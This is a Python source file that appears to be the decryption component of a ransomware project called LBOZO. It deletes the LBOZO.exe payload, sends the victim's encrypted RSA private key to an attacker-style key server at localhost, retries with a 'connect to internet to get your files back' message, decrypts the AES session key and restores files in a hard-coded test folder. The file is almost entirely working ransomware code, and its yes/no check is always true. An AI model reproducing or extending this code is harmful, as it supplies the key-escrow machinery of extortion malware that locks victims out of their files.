from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
import sys
import os
import pickle
import requests
import time
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from utils import *
from utils import (
    ransomware_path,
    encrypted_client_private_key_path,
    client_public_key_path,
    ransomware_path,
)

if os.path.exists(ransomware_path + "\\LBOZO.exe"):
    os.remove(ransomware_path + "\\LBOZO.exe")

server_address = "http://localhost:8000/decryptkey/"


def send_to_server_encrypted_private_key(private_encrypted_key):
    try:
        ret = requests.post(server_address, data=private_encrypted_key)
    except Exception as e:
        raise e

    print("key decrypted")

    private_key = ret.text
    return str(private_key)


decryptend = input("Decrypt? (y/n): ")
if decryptend == "y" or "Y":

    with open(encrypted_client_private_key_path, "rb") as f:
        encrypted_client_private_key = pickle.load(f)

    while True:
        try:
            print("Requesting to server to decrypt the private key")
            client_private_key = send_to_server_encrypted_private_key(
                encrypted_client_private_key
            )
            break
        except:
            print("No connection, sleeping for 2 minutes\nConnect \
                  to internet to get your files back!")
            time.sleep(120)


    with open(ransomware_path + "\\session_key.txt", "rb") as f:
        enc_session_key = f.read()

    private_key = RSA.import_key(client_private_key)
    cipher_rsa = PKCS1_OAEP.new(private_key)

    n = 256  # chunk length
    chunks = [enc_session_key[i : i + n] for i in range(0, len(enc_session_key), n)]
    final_session_decrypted = b""
    for i in chunks:
        session_key = cipher_rsa.decrypt(i)
        final_session_decrypted += session_key

    removeFiles = True

    paths = ["C:\\Users\\noahs\\Desktop\\Repos\\LBOZO\\tests"]

    for x in paths:
        final_session_decrypted = final_session_decrypted.decode()
        path = x
        generateDecryptThreads(final_session_decrypted, removeFiles, path)
    os.remove(ransomware_path + "\\session_key.txt")
    os.remove(encrypted_client_private_key_path)
    os.remove(client_public_key_path)
    sys.exit()
else:
    sys.exit()
